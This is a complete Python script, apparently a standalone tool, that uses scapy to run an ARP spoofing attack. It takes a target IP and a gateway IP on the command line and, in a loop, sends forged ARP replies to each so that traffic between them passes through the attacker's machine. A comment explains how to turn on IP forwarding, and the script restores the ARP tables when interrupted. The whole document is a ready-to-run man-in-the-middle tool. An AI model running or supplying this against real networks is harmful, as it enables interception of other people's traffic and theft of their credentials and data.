import scapy.all as scapy
import time
import argparse

# echo 1> /proc/sys/net/ipv4/ip_forward ==> to enable ip forwarding

parser = argparse.ArgumentParser(description='- ARP Spoofer.', usage='python ARP_Spoofer.py -t <Target> -g <Gateway>')
parser.add_argument('-t', '--target', required=True, metavar='', help='Specify a target')
parser.add_argument('-g', '--gateway', required=True, metavar='', help='Specify gateway')
args = parser.parse_args()


def get_mac(ip):
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp = scapy.ARP(pdst=ip)
    arp_request = broadcast/arp
    answered = scapy.srp(arp_request, timeout=1, verbose=0)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
    scapy.send(arp_response, verbose=0)

def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    restore = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
    scapy.send(restore, count=4, verbose=0)

try:
    count = 0
    print(f'[*] ARP spoofing started on: {args.target}, {args.gateway} ')
    while True:
        spoof(args.target, args.gateway)
        spoof(args.gateway, args.target)
        count += 1
        print('\r[*] Packets sent: ' + str(count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\r\n[*] Detected CTRL+C, Restoring ARP tables....')
    restore(args.target, args.gateway)
    restore(args.gateway, args.target)
except:
    print('\r\n[*] Error connecting to targets!')
